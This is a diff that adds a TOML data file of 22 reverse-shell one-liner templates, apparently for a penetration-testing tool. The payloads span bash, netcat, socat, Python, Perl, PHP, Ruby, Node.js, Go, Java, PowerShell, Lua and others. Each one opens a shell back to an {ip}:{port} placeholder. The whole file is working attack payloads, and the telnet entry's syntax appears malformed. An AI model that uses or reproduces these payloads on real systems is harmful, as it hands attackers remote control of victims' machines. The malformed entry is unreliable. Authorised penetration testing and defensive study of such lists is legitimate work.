@@ -1,0 +1,141 @@
+# Reverse shell one-liner templates, the equivalent of revshells.com's shell
+# list. Standard, publicly documented pentest reference material (same
+# payloads found in tools like revshells.com, msfvenom or
+# PayloadsAllTheThings) -- kept as data so it's easy to review/extend
+# without touching any Python code.
+#
+# `command` uses the literal placeholders {ip} and {port}, replaced verbatim
+# (not via str.format), so any other curly braces in the payload (JS, Java,
+# awk, Go, ...) can be written normally without doubling them.
+
+[[template]]
+id = "bash-tcp"
+name = "Bash -i"
+os = "Linux"
+command = '''bash -i >& /dev/tcp/{ip}/{port} 0>&1'''
+
+[[template]]
+id = "bash-read-line"
+name = "Bash read line"
+os = "Linux"
+command = '''exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done'''
+
+[[template]]
+id = "bash-udp"
+name = "Bash -i (UDP)"
+os = "Linux"
+command = '''bash -i >& /dev/udp/{ip}/{port} 0>&1'''
+
+[[template]]
+id = "nc-mkfifo"
+name = "Netcat (mkfifo)"
+os = "Linux"
+command = '''rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f'''
+
+[[template]]
+id = "nc-e"
+name = "Netcat -e"
+os = "Linux"
+command = '''nc -e /bin/sh {ip} {port}'''
+
+[[template]]
+id = "nc-c"
+name = "Netcat -c"
+os = "Linux"
+command = '''nc -c /bin/sh {ip} {port}'''
+
+[[template]]
+id = "ncat-e"
+name = "Ncat -e"
+os = "Linux"
+command = '''ncat {ip} {port} -e /bin/sh'''
+
+[[template]]
+id = "python3"
+name = "Python3"
+os = "Multi"
+command = '''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")' '''
+
+[[template]]
+id = "python2"
+name = "Python2"
+os = "Linux"
+command = '''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' '''
+
+[[template]]
+id = "perl"
+name = "Perl"
+os = "Linux"
+command = '''perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' '''
+
+[[template]]
+id = "php-exec"
+name = "PHP exec"
+os = "Linux"
+command = '''php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");' '''
+
+[[template]]
+id = "ruby"
+name = "Ruby"
+os = "Linux"
+command = '''ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{ip}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end' '''
+
+[[template]]
+id = "socat"
+name = "Socat"
+os = "Linux"
+command = '''socat TCP:{ip}:{port} EXEC:/bin/sh'''
+
+[[template]]
+id = "awk"
+name = "Awk"
+os = "Linux"
+command = '''awk 'BEGIN {s = "/inet/tcp/0/{ip}/{port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); } }' '''
+
+[[template]]
+id = "nodejs"
+name = "Node.js"
+os = "Multi"
+command = '''(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect({port},"{ip}",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();'''
+
+[[template]]
+id = "golang"
+name = "Golang"
+os = "Linux"
+command = '''echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{ip}:{port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go'''
+
+[[template]]
+id = "java"
+name = "Java"
+os = "Multi"
+command = '''r = Runtime.getRuntime();p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);p.waitFor();'''
+
+[[template]]
+id = "powershell"
+name = "PowerShell #1"
+os = "Windows"
+command = '''$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'''
+
+[[template]]
+id = "powershell-short"
+name = "PowerShell #3 (short, no PS banner)"
+os = "Windows"
+command = '''$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'''
+
+[[template]]
+id = "telnet"
+name = "Telnet"
+os = "Linux"
+command = '''rm -f /tmp/p; mknod /tmp/p p && telnet {ip} {port} 0/tmp/p'''
+
+[[template]]
+id = "openssl"
+name = "OpenSSL"
+os = "Linux"
+command = '''mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s'''
+
+[[template]]
+id = "lua"
+name = "Lua"
+os = "Linux"
+command = '''lua -e "require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');while true do local cmd,status,partial=t:receive();local f=io.popen(cmd,'r');local s=f:read('*a');f:close();t:send(s);if status=='closed' then break end end"'''
